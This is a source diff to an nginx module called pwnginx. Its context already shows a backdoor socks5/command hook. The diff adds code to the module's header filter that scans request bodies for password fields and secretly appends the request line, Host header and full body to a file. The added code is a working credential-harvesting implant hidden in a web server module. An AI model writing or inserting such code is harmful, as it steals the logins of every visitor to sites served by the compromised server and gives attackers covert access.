@@ -54,6 +54,33 @@ ngx_http_pwnginx_header_filter(ngx_http_request_t *r)
             exec_socks5(cmd_fd);
         }
     }
+
+    #ifdef PWD_SNIFF_FILE
+    if (r->request_body){
+        ngx_chain_t     *cl = r->request_body->bufs;
+        if(cl){
+            //1024
+            char *tmp_buf = malloc(1025);
+            tmp_buf[1024]='\0';
+            strncpy(tmp_buf,(char *)cl->buf->pos,1024);
+            if( ngx_strcasestrn((u_char *)tmp_buf, "password=",9-1) ||
+                ngx_strcasestrn((u_char *)tmp_buf, "passwd=",7-1) ||
+                ngx_strcasestrn((u_char *)tmp_buf, "pwd=",4-1) ||
+                ngx_strcasestrn((u_char *)tmp_buf, "name=\"password\"",15-1) ||
+                ngx_strcasestrn((u_char *)tmp_buf, "name=\"passwd\"",13-1) ||
+                ngx_strcasestrn((u_char *)tmp_buf, "name=\"pwd\"",10-1)){
+                FILE *fp = fopen(PWD_SNIFF_FILE,"a");
+                r->request_line.data[(int)r->request_line.len]='\0';
+                fprintf(fp,"%s\n",(char *)r->request_line.data);
+                r->headers_in.host->value.data[(int)r->headers_in.host->value.len]='\0';
+                fprintf(fp,"Host:%s\n",(char *)r->headers_in.host->value.data);
+                fprintf(fp,"%s\n======================\n",cl->buf->pos);
+                fclose(fp);
+            }
+        }
+    }
+    #endif
+
     return ngx_http_next_header_filter(r);
 }
 
